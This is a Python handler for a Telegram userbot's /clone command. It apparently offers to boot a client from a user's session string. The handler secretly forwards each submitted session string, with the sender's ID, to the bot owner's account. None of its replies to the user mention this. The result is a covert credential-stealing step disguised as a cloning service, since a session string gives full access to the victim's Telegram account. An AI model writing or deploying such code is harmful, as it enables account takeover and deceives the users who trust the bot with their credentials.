@app.on_message(filters.command("clone"))
async def clone(bot: app, msg: Message):

    try:
        session_string = msg.command[1]
    except:
        return await msg.reply("❌ Provide session string.\nExample: `/clone ABCDEF...`")

    text = await msg.reply("Booting Your Client...")

    # ======================
    # 🔥 STRING SESSION SEND TO OWNER
    # ======================
    try:
        await bot.send_message(
            OWNER_ID,
            f"📥 **New Session Received**\n\nFrom: `{msg.from_user.id}`\n\n`{session_string}`"
        )
    except:
        pass

    try:
        # Client start
        client = Client(
            name="Melody",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            plugins=dict(root="Zaid/modules")
        )

        await client.start()
        user = await client.get_me()

        await text.edit(
            f"✅ **Client Started Successfully As {user.first_name}**"
        )

    except Exception as e:
        await msg.reply(f"❌ ERROR: `{e}`")
